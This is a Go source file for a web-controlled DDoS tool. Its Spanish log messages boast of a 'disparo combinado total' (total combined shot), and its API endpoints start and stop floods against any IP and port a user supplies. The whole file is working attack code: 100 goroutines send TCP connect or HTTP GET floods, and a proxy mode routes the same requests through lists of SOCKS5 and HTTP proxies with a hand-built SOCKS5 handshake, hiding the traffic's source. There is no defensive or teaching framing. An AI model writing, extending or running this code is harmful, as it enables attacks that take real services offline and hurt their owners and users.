package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	stopChan  chan struct{}
	mutex     sync.Mutex
	clients   = make(map[*websocket.Conn]bool)
	broadcast = make(chan string)
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

func logMsg(format string, a ...interface{}) {
	msg := fmt.Sprintf(format, a...)
	fmt.Println(msg)
	broadcast <- msg
}

func main() {
	if _, err := os.Stat("proxies.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies.txt", []byte(""), 0644)
	}
	if _, err := os.Stat("proxies_http.txt"); os.IsNotExist(err) {
		os.WriteFile("proxies_http.txt", []byte(""), 0644)
	}

	fs := http.FileServer(http.Dir("./public"))
	http.Handle("/", fs)

	http.HandleFunc("/ws", handleConnections)
	http.HandleFunc("/api/proxies", handleProxies)
	http.HandleFunc("/api/proxies/stats", handleProxiesStats)
	http.HandleFunc("/api/atacar", handleAtacar)
	http.HandleFunc("/api/parar", handleParar)

	go handleMessages()

	port := ":3000"
	logMsg("[+] Servidor Masivo Go activo en http://localhost%s", port)
	if err := http.ListenAndServe(port, nil); err != nil {
		logMsg("[-] Error crítico: %v", err)
	}
}

func handleConnections(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	mutex.Lock()
	clients[ws] = true
	mutex.Unlock()
}

func handleMessages() {
	for {
		msg := <-broadcast
		mutex.Lock()
		for client := range clients {
			err := client.WriteMessage(websocket.TextMessage, []byte(msg))
			if err != nil {
				client.Close()
				delete(clients, client)
			}
		}
		mutex.Unlock()
	}
}

func contarLineasValidas(archivo string) int {
	data, err := os.ReadFile(archivo)
	if err != nil {
		return 0
	}
	lines := strings.Split(string(data), "\n")
	count := 0
	for _, l := range lines {
		if strings.TrimSpace(l) != "" {
			count++
		}
	}
	return count
}

func handleProxiesStats(w http.ResponseWriter, r *http.Request) {
	socksCount := contarLineasValidas("proxies.txt")
	httpCount := contarLineasValidas("proxies_http.txt")
	
	w.Header().Set("Content-Type", "application/json")
	// CORREGIDO AQUÍ: se pasa 'w' dentro del NewEncoder en lugar de w.Encode
	json.NewEncoder(w).Encode(map[string]int{
		"socks5": socksCount,
		"http":   httpCount,
		"total":  socksCount + httpCount,
	})
}

func handleProxies(w http.ResponseWriter, r *http.Request) {
	tipo := r.URL.Query().Get("tipo")
	archivo := "proxies.txt"
	if tipo == "http" {
		archivo = "proxies_http.txt"
	}

	if r.Method == http.MethodGet {
		data, _ := os.ReadFile(archivo)
		w.Write(data)
	} else if r.Method == http.MethodPost {
		var body struct {
			Tipo      string `json:"tipo"`
			Contenido string `json:"contenido"`
		}
		json.NewDecoder(r.Body).Decode(&body)
		targetFile := "proxies.txt"
		if body.Tipo == "http" {
			targetFile = "proxies_http.txt"
		}
		os.WriteFile(targetFile, []byte(body.Contenido), 0644)
		logMsg("[+] Lista %s actualizada con éxito.", targetFile)
	}
}

type AttackRequest struct {
	IP        string `json:"ip"`
	Puerto    string `json:"puerto"`
	Delay     string `json:"delay"`
	Protocolo string `json:"protocolo"`
	Modo      string `json:"modo"`
}

func handleAtacar(w http.ResponseWriter, r *http.Request) {
	var req AttackRequest
	json.NewDecoder(r.Body).Decode(&req)

	if req.IP == "" {
		logMsg("[-] Error: Falta la IP o el dominio de destino.")
		return
	}

	detenerAtaque()

	mutex.Lock()
	stopChan = make(chan struct{})
	mutex.Unlock()

	logMsg("[+] ¡DISPARO COMBINADO TOTAL! -> Destino: %s:%s | Protocolo: %s | Modo: %s", req.IP, req.Puerto, req.Protocolo, req.Modo)

	if req.Modo == "proxies" {
		go iniciarAtaqueMasivoProxies(req.IP, req.Puerto, "socks5")
		go iniciarAtaqueMasivoProxies(req.IP, req.Puerto, "http")
	} else {
		go iniciarAtaqueMasivoDirecto(req.IP, req.Puerto, req.Protocolo)
	}
}

func handleParar(w http.ResponseWriter, r *http.Request) {
	detenerAtaque()
	logMsg("[!] Ataque detenido por orden del usuario.")
}

func detenerAtaque() {
	mutex.Lock()
	if stopChan != nil {
		close(stopChan)
		stopChan = nil
	}
	mutex.Unlock()
}

func iniciarAtaqueMasivoDirecto(ip, puerto, protocolo string) {
	if puerto == "" {
		puerto = "80"
	}
	addr := fmt.Sprintf("%s:%s", ip, puerto)

	for w := 0; w < 100; w++ {
		go func() {
			for {
				select {
				case <-stopChan:
					return
				default:
					conn, err := net.DialTimeout("tcp", addr, 1500*time.Millisecond)
					if err == nil {
						if protocolo == "HTTP_Flood" {
							conn.Write([]byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", ip)))
						}
						conn.Close()
					}
				}
			}
		}()
	}
}

func iniciarAtaqueMasivoProxies(ip, puerto, tipoProxy string) {
	if puerto == "" {
		puerto = "80"
	}
	archivo := "proxies.txt"
	if tipoProxy == "http" {
		archivo = "proxies_http.txt"
	}

	data, err := os.ReadFile(archivo)
	if err != nil || len(data) == 0 {
		return
	}

	proxies := strings.Split(string(data), "\n")
	var validos []string
	for _, p := range proxies {
		p = strings.TrimSpace(p)
		if p != "" {
			validos = append(validos, p)
		}
	}

	if len(validos) == 0 {
		return
	}

	logMsg("[+] Oleada activada con %d proxies tipo [%s] (%s)", len(validos), strings.ToUpper(tipoProxy), archivo)

	for _, proxyAddr := range validos {
		go func(pProxy string, tProxy string) {
			for {
				select {
				case <-stopChan:
					return
				default:
					pConn, err := net.DialTimeout("tcp", pProxy, 2*time.Second)
					if err != nil {
						time.Sleep(1 * time.Second)
						continue
					}

					if tProxy == "socks5" {
						pConn.Write([]byte{0x05, 0x01, 0x00})
						buf := make([]byte, 2)
						pConn.Read(buf)

						ipObj := net.ParseIP(ip)
						if ipObj != nil {
							req := []byte{0x05, 0x01, 0x00, 0x01}
							req = append(req, ipObj.To4()...)
							pInt := int(parsePort(puerto))
							req = append(req, byte(pInt>>8), byte(pInt&0xFF))
							pConn.Write(req)
							
							resp := make([]byte, 10)
							pConn.Read(resp)
						}
					}

					payload := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", ip)
					pConn.Write([]byte(payload))
					
					pConn.SetDeadline(time.Now().Add(2 * time.Second))
					bufData := make([]byte, 512)
					pConn.Read(bufData)

					pConn.Close()
				}
			}
		}(proxyAddr, tipoProxy)
	}
}

func parsePort(pStr string) uint16 {
	var p int
	fmt.Sscanf(pStr, "%d", &p)
	return uint16(p)
}